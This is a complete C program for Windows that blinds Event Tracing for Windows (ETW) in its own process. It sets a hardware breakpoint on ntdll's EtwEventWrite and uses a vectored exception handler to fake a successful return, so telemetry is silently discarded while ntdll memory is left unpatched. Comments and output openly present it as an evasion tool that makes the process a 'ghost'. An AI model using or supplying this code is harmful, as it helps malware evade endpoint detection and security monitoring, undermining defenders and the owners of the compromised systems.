#include <windows.h>
#include <stdio.h>

// Global pointer to the snitch function
PVOID g_EtwEventWrite = NULL;

// Fox's VEH to catch the hardware breakpoint
LONG WINAPI FoxVeh(PEXCEPTION_POINTERS ExceptionInfo) {
    // Check if it's our hardware breakpoint (Single Step)
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        
        // Did we hit EtwEventWrite?
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_EtwEventWrite) {
            
            // 1. Simulate a successful return (RAX = 0 / ERROR_SUCCESS)
            ExceptionInfo->ContextRecord->Rax = 0;
            
            // 2. Simulate the 'RET' instruction to cleanly exit the function without executing it
            // Read the return address from the top of the stack into RIP
            ExceptionInfo->ContextRecord->Rip = *(PDWORD64)ExceptionInfo->ContextRecord->Rsp;
            
            // Pop the stack (RSP = RSP + 8)
            ExceptionInfo->ContextRecord->Rsp += 8;

            // 3. Tell the OS to continue execution from our new RIP
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    // Not our exception, pass it down the chain
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL BlindEtwHardware() {
    // 1. Find the target function
    g_EtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if (!g_EtwEventWrite) return FALSE;

    // 2. Register our VEH as the first handler in the chain
    AddVectoredExceptionHandler(1, FoxVeh);

    // 3. Get the current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);

    // 4. Set Hardware Breakpoint (DR0) on EtwEventWrite
    ctx.Dr0 = (DWORD64)g_EtwEventWrite;
    
    // Enable DR0 locally (Bit 0)
    ctx.Dr7 |= 1; 
    
    // Clear condition/length bits for DR0 to set it as an Execution breakpoint (1 byte)
    ctx.Dr7 &= ~(0xF0000); 

    // 5. Apply the modified context to the CPU
    SetThreadContext(hThread, &ctx);
    
    printf("[+] ETW blinded via CPU silicon.\n");
    printf("[+] ntdll.dll memory is untouched. Hash matches disk.\n");
    
    return TRUE;
}

int main() {
    if (BlindEtwHardware()) {
        // Any subsequent OS calls in this thread that trigger ETW 
        // will hit the HWBP and be silently discarded.
        printf("[!] We are a ghost in our own process.\n");
    }
    return 0;
}